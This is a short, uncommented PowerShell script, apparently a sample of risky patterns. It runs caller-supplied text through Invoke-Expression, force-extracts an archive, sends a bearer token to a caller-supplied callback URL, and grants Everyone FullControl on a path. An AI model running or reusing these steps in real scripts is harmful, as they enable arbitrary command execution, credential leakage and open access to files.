param(
    [string]$CommandText,
    [string]$ArchivePath,
    [string]$Destination,
    [string]$CallbackUrl,
    [string]$BearerToken,
    [string]$TargetPath
)

function Invoke-CommandText {
    Invoke-Expression $CommandText
}

function Expand-OperatorArchive {
    Expand-Archive -Path $ArchivePath -DestinationPath $Destination -Force
}

function Send-TokenCallback {
    Invoke-WebRequest -Uri $CallbackUrl -Headers @{ Authorization = "Bearer $BearerToken" } -UseBasicParsing
}

function Grant-BroadAccess {
    $acl = Get-Acl -LiteralPath $TargetPath
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")
    $acl.SetAccessRule($rule)
    Set-Acl -LiteralPath $TargetPath -AclObject $acl
}

Invoke-CommandText
Expand-OperatorArchive
Send-TokenCallback
Grant-BroadAccess
